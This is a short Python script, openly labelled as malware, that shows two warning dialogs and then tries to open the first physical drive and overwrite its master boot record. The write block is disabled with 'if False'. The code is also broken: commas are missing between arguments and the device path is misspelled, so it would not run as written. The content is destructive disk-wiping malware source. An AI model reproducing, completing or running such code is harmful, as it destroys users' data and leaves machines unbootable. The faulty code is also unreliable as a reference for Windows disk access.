from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import time

def main():
    if MessageBox("WARNING! The software you just executed is considered MALWARE and will make your computer unusable. This warning is here to protect you from destroying your computer.", "WARNING!", MB_ICONWARNING | MB_YESNO) == 7: # no
        return
    if MessageBox("If you read the previous warning and have a virtual machine ready, up and running, like Windows Sandbox, VirtualBox or VMware Player, or VMware Workstation is all safe enviroments to run this. THIS IS THE LAST WARNING BEFORE RUNNING.", "Warning, AGAIN!", MB_ICONWARNING | MB_YESNO) == 7: # no
        return
# starts overwriting mbr
    if False:
        hDevice = CreateFileW("\\\\.\\PhysichalDrive0"
                                 GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE
                                 None,
                                 OPEN_EXISTING,
                                 0,0
                                 )
        WriteFile(hDevice
                                 AllocateReadBuffer(512) # python bufferer
                                 None # NONE 
                                 ) # finale
        CloseHandle(hDevice) # clear memory

main()